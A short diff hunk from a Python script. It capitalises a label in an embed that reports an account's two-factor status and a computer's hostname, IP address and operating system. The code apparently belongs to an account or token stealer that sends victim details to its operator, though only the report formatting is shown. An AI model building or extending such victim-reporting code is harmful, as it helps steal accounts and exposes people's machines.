@@ -135,7 +135,7 @@ async def main():
 **2 Factor Enabled:** {twofa}
 """, inline=False)
     
-    embed.add_embed_field(name="`Pc Information`", value=f"""
+    embed.add_embed_field(name="`PC Information`", value=f"""
 **Computer Name:** {computer_info['hostname']}
 **IP Address:** {computer_info['ip_address']}
 **Operating System:** {computer_info['platform']}
